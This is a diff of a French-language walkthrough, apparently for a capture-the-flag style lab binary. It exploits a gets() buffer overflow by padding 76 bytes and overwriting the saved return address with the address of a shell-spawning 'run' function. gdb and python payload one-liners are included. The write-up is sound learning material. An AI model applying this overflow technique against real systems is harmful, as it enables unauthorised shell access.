@@ -12,7 +12,7 @@ Cette ligne nous interesse. Gets ne securise pas son buffer. Il est alors possib
 
 Si on recupere le code C a partir de Ghidra, on s'apercoit qu'il y a une fonction run qui permet de lancer un shell.
 On voit aussi que le buffer que recoit gets() est de 76.
-Nous allons recuperer l'adresse de run ainsi que l'adresse de system pour construire notre shellcode.
+Nous allons recuperer l'adresse de run pour construire notre shellcode.
 
 	gdb ./level1
 	(gdb) p run
@@ -24,11 +24,11 @@ Pour lancer notre bufferoverflow nous utiliserons cette commande :
 
 	python -c 'print "0" * 76' | ./level1
 
-En rajoutant le shell code pour appeler l'adresse de run dans l'overflow pour qu'il soit executee :
+En rajoutant l'adresse de run pour qu'il soit executee sur le retour EIP :
 
 	python -c 'print "0" * 76 + "\x44\x84\x04\x08"' | ./level1
 
-Nous avons tentee d'ecrire le shellcode dans un fichier :
+Nous ecrit le shellcode dans un fichier :
 
 	python -c 'print "0" * 76 + "\x44\x84\x04\x08"' > /tmp/shellcode
 
